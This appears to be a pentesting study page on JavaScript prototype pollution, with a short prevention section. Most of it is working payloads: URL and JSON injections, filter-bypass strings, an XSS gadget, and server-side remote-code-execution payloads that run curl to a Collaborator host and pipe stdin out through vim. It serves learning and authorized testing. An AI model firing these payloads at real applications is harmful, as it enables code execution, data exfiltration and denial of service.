---
layout: default
title: "Prototype Pollution"
parent: "Web Application"
nav_order: 26
---

# Prototype Pollution

Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.

---

## JavaScript Prototype Background

Every object in JavaScript is linked to a prototype. Objects automatically inherit all properties of their assigned prototype unless they have their own property with the same key.

```javascript
// Accessing prototype chain
username.__proto__              // String.prototype
username.__proto__.__proto__    // Object.prototype
username.__proto__.__proto__.__proto__ // null
```

Via constructor:
```javascript
myObject.constructor.prototype  // Object.prototype (equivalent to myObject.__proto__)
```

Modifying `Object.prototype` affects ALL objects:
```javascript
Object.prototype.isAdmin = true;
console.log({}.isAdmin); // true
```

---

## Vulnerability Overview

Prototype pollution typically arises when a JavaScript function **recursively merges** user-controllable objects without sanitizing keys — allowing `__proto__` to be interpreted as a prototype accessor rather than an ordinary property.

**Three required components:**
1. **Source** — user-controllable input that can pollute a prototype (URL query/fragment, JSON, web messages)
2. **Sink** — JS function or DOM element enabling arbitrary code execution
3. **Gadget** — a property that is passed to a sink without sanitization and is inheritable via prototype pollution

---

## Attack Vectors

### Via URL Query String
```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
https://vulnerable-website.com/?__proto__.evilProperty=payload
```

Testing in browser console:
```javascript
Object.prototype.foo  // "bar" = polluted; undefined = not successful
```

### Via JSON (JSON.parse)
`JSON.parse()` treats `__proto__` as an arbitrary string key, resulting in a true prototype property:
```json
{
  "__proto__": {
    "evilProperty": "payload"
  }
}
```

**Difference:**
```javascript
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');   // false
objectFromJson.hasOwnProperty('__proto__');  // true — prototype actually polluted
```

### Via Constructor
Alternative when `__proto__` is filtered:
```
/?constructor[prototype][foo]=bar
/?constructor.prototype.foo=bar
```

---

## Bypassing Sanitization

If the app strips `__proto__`, try nested versions that survive sanitization:
```
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
```

---

## Client-Side Exploitation

### Finding Gadgets Manually
1. Inject arbitrary property via URL: `?__proto__[foo]=bar`
2. In browser console, check `Object.prototype.foo`
3. Look through source code for properties used by the app or libraries
4. In Burp, intercept the response JS, add a `debugger` statement
5. In console, define a trace property:
   ```javascript
   Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
     get() { console.trace(); return 'polluted'; }
   })
   ```
6. Monitor console for stack traces — if one appears, the property is being accessed
7. Follow stack trace to find if it reaches a dangerous sink (`innerHTML`, `eval()`, etc.)

### Recommended Tool: DOM Invader (Burp)
Use DOM Invader for automated client-side prototype pollution detection.

### Example: Fetch API Gadget
```javascript
fetch('/my-products.json', {method:"GET"})
  .then(response => response.json())
  .then(data => {
    let username = data['x-username'];
    // username passed to innerHTML = gadget
    message.innerHTML = `Logged in as <b>${username}</b>`;
  });
```

Exploit:
```
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```

### Example: External Library Gadget
```javascript
// Exploit server payload
document.location="https://VULNERABLE-SITE.net/filter?category=foo#constructor[prototype][hitCallback]=alert(document.cookie)"
```

### DOM XSS via Prototype Pollution
Some apps use `manager.sequence` or similar properties — pollute with:
```
?__proto__[sequence]=foo-
```
Note: adding `-` at the end may be needed to prevent `+1` from appending.

---

## Server-Side Prototype Pollution

Harder to detect — dev tools unavailable, failures can be persistent and cause DoS.

### JSON Body Injection
```json
{
  "user": "wiener",
  "__proto__": {
    "foo": "bar"
  }
}
```
Check if `foo` appears in the response or changes behavior.

If `__proto__` doesn't work, try:
```json
{
  "constructor": {
    "prototype": {
      "json spaces": 2
    }
  }
}
```

### Detection Technique 1: JSON Spaces Override
Express framework `json spaces` option controls JSON indentation in responses:
```json
{
  "__proto__": {
    "json spaces": 10
  }
}
```
Check the **Raw** response tab in Burp for increased indentation. This confirms server-side prototype pollution.

### Detection Technique 2: Status Code Override
Express allows custom HTTP response codes. Try overriding status:
```json
{
  "__proto__": {
    "status": 510
  }
}
```

### Detection Technique 3: Charset Override
If the server uses `body-parser`, the charset may be controllable:
1. Add UTF-7 encoded value to a reflected property: `foo` = `+AGYAbwBv-`
2. Pollute charset:
   ```json
   {
     "__proto__": {
       "content-type": "application/json; charset=utf-7"
     }
   }
   ```
3. Resend the original request — if the UTF-7 is now decoded, prototype pollution works

---

## Remote Code Execution via Server-Side Prototype Pollution

### NODE_OPTIONS + shell
Pollute `env` via the prototype chain:
```json
{
  "__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
  }
}
```
Triggers Burp Collaborator interaction when new Node child processes spawn.

### execArgv (child_process.fork)
```json
{
  "__proto__": {
    "execArgv": [
      "--eval=require('child_process').execSync('curl COLLABORATOR-URL')"
    ]
  }
}
```

### child_process.execSync via shell + input
```json
{
  "__proto__": {
    "shell": "vim",
    "input": ":! curl -d @- COLLABORATOR-URL\n"
  }
}
```

Notes:
- `input` is passed to the child process's `stdin`
- `shell` accepts only the executable name (no args)
- Vim satisfies all requirements: accepts stdin, uses `-c` for commands
- For `curl`: use `-d @-` to read from stdin; use `xargs` to convert stdin to arguments

---

## Denial of Service
Override commonly used functions:
```json
{
  "__proto__": {
    "toString": "Just crash the server"
  }
}
```

---

## Prevention
- `Object.freeze(Object.prototype)` — prevents modification of prototype properties
- `Object.seal(Object.prototype)` — allows value changes but no new properties
- Sanitize keys in recursive merge/clone operations before processing
